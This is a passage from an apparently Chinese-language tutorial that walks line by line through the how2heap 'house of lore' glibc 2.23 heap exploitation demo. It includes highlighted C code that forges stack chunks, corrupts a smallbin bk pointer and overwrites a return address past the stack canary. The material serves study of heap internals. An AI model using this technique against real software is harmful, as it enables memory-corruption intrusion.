punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating the victim chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 申请一个可以释放到 smallbin 的 chunk</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the first small chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim_chunk <span class=\"token operator\">=</span> victim<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获得头指针的地址</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_1 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_2 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这一部分就开始初步的申请空间</p>\n<pre><code>buffer1=0x7fffffffdcc0\nbuffer2=0x7fffffffdca0\nvictim=0x555555759010\nvictim_chunk=0x555555759000\n</code></pre>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/2%7D%7EUCP%5BAKA5NE%24H%60%25O0B%7E04.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/Z7J%7BIIG%28JOEBS6%28YD%5D%25W0OL.png\" alt=\"\" /></p>\n<h2 id=\"2执行到63行\"><a class=\"anchor\" href=\"#2执行到63行\">#</a> 2. 执行到 63 行</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Create a fake chunk on the stack\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>         <span class=\"token string\">\"in second to the last malloc, which putting stack address on smallbin list\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//pre_size</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//size</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> victim_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 改写 fd，绕过申请 smallbin 的检测</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         <span class=\"token string\">\"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token string\">\"chunk on stack\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 改写 bk</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span><span class=\"token comment\">// 到这里的双链表结构 buffer2&lt;=>buffer1->victim (\"->\" 代表 fd ；\"&lt;-\" 代表 bk )</span></pre></td></tr></table></figure><p><s>【为什么没有 size 的检测？检测 size 一般在合并的时候检测】</s></p>\n<p>在栈上构造了 <code>fake_chunk</code>  的结构，修改了 buffer1 的 fd 绕过了 <code>检测</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/UP61ZJE%7DS%24BFMWZYVU641R4.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/2A0CF%28G6TY%25BDI2BJ%29HGU%5BD.png\" alt=\"\" /></p>\n<p>检测：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__glibc_unlikely</span> <span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                  errstr <span class=\"token operator\">=</span> <span class=\"token string\">\"malloc(): smallbin double linked list corrupted\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                  <span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>              <span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>              bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>              bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>从上面看到，想要申请从 smallbin 空间就要 bck-&gt;fd=victim (相当于 buffer1-&gt;fd=victim) , 这样才能将 buffer1 给带入 smallbin 中被后续申请出去</p>\n<h3 id=\"3执行到68行\"><a class=\"anchor\" href=\"#3执行到68行\">#</a> 3. 执行到 68 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating another large chunk in order to avoid consolidating the top chunk with\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>         <span class=\"token string\">\"the small one during the free()\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p5 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the large chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> p5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>申请一个 large chunk 为了防止紧挨着 topchunk 发生合并</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/SL8ZD13VB%25%7BB_8EGI%7DWL2EL.png\" alt=\"\" /></p>\n<h3 id=\"4执行到76行\"><a class=\"anchor\" href=\"#4执行到76行\">#</a> 4. 执行到 76 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>释放申请的 small chunk，但是它不会一开始就进入 smallbin 中，它会先进入到 unsorted bin 中直到下一次执行 malloc</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/TSR1N9Q%299W3S4PG%29A596T9E.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/P3%5BV_7Y3V%40JOTOL5R%293U5VJ.png\" alt=\"\" /></p>\n<p>看到先进入了 unsortedbin 中，并且这里只有一个 chunk 所以这个 chunk 的 fd 和 bk 都会指向 <code>main_arena</code>  的地方</p>\n<p><code>注意：</code></p>\n<p>在后面执行 malloc 的时候，会再次进行分配，下一次分配（malloc）的大小如果比它大，那么将从 <code> top chunk</code>  上分配相应大小，而该 chunk 会被取下 link 到相应的 bin 中。如果比它小 (相等则直接返回)，则从该  <code>chunk</code>  上切除相应大小，并返回相应 chunk，剩下的成为 <code> last reminder chunk</code>  , 还是存在  <code>unsorted bin</code>  中，不会放入 <code>small/large bin</code>  中。</p>\n<h3 id=\"5执行到86行\"><a class=\"anchor\" href=\"#5执行到86行\">#</a> 5. 执行到 86 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This means that the chunk %p will be inserted in front of the SmallBin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p2 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//0x4B0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\"</span><span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//victim will be inserted in the small bin</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里申请一个 1200 大小的 <code>large chunk</code> ，而 bin 中没有 chunk 满足，就在 <code>top chunk</code>  上切割一个分配，在 <code>unsorted bin</code>  中的 chunk 就会归属到对应的 <code>small/large bin</code>  下，这里的 victim 就进入了 <code>smallbin</code>  中</p>\n<p>下面的图里可以看出进入了 <code>smal_lbin</code>  中</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/ML02%7EGGWZKEF%29%5DS8%24Q6YMWD.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/YKNM2CB6ZL9LYMDWX%7B%25W%604O.png\" alt=\"\" /></p>\n<h3 id=\"6执行到92行\"><a class=\"anchor\" href=\"#6执行到92行\">#</a> 6. 执行到 92 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// victim->bk is pointing to stack</span></pre></td></tr></table></figure><p>这里修改了  <code>victim[1] =stack_buffer_1</code> , 所以就让 bk 指向了 buffer1 （fd 还是没有变，仍指向 <code>main_arena</code> ）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/2P0E%60ZTA%7BQQL9Z4%2972QG9B2.png\" alt=\"\" /></p>\n<h3 id=\"7执行到99行\"><a class=\"anchor\" href=\"#7执行到99行\">#</a> 7. 执行到 99 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now allocating a chunk with size equal to the first one freed\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里将释放的 victim 从 <code>small_bin</code>  申请回去，然后根据：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>              bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>              bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>就会将 victim-&gt;bk 作为 <code>small_bin</code>  最后一个 chunk（也就是 buffer1），再申请的话就会申请到 buffer1</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/A%6062OI0%608KCM1%7E6F%401%7BZXDU.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/UX6H%7DTO71FQGG%7B%28B%7BY9W8RR.png\" alt=\"\" /></p>\n<p>这里可以发现 <code>small_bin</code>  中的 bk 已经改变了，从 buffer1 指向了 buffer2</p>\n<p>【又出来一个疑问，为什么没有修改 buffer 的 size（这里的 size 位为 0），申请的 small_chunk 不满足大小怎么办】从源码大概理解为什么：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 判断范围是否符合 `small_bin`</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      idx <span class=\"token operator\">=</span> <span class=\"token function\">smallbin_index</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 判断哪个 index 符合大小，找申请的大小满足的 index</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      bin <span class=\"token operator\">=</span> <span class=\"token function\">bin_at</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里发现，判断了要申请的大小符合的 index，在对应的 index 里有 chunk 就直接从该 index 里取出就行，不用在判断 size 的大小，因为找到的 index 就默认了这里的 chunk 符合申请的空间大小；所以我们利用 victim 将 buffer 插入了这里，那么申请 0x100 的大小就会默认 buffer1 符合</p>\n<h3 id=\"8执行到107行\"><a class=\"anchor\" href=\"#8执行到107行\">#</a> 8. 执行到 107 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p4 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"p4 = malloc(0x100)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>         stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里将 buffer1 申请出去，因为其 bk 指向 buffer2，且 buffer2-&gt;fd 也指向了 buffer1，所以将 buffer2 也加入了 smallbin 中</p>\n<p>申请前的 buffer2：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/CV%60U8JL%7E%5DME7K%7DVHPJGOEQE.png\" alt=\"\" /></p>\n<p>申请后的 buffer2：<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/EV__2CG1H%25%5BG3R%240WJ26%5DEO.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/XF%5D2P%5DDT%40X%5DX%5B2PSY6EO%7DPJ.png\" alt=\"\" /></p>\n<h3 id=\"9执行到115行\"><a class=\"anchor\" href=\"#9执行到115行\">#</a> 9. 执行到 115 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\np4 is %p and should be on the stack!\\n\"</span><span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// this chunk will be allocated on stack</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> sc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Emulating our in-memory shellcode</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">long</span> offset <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_frame_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>p4<span class=\"token punctuation\">;</span><span class=\"token comment\">//buffer 的 rbp 到 p4 的偏移</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>p4<span class=\"token operator\">+</span>offset<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sc<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// This bypasses stack-smash detection since it jumps over the canary；将 sc 覆盖到返回地址处</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//+8?</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// sanity check</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_return_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token comment\">//__builtin_return_address 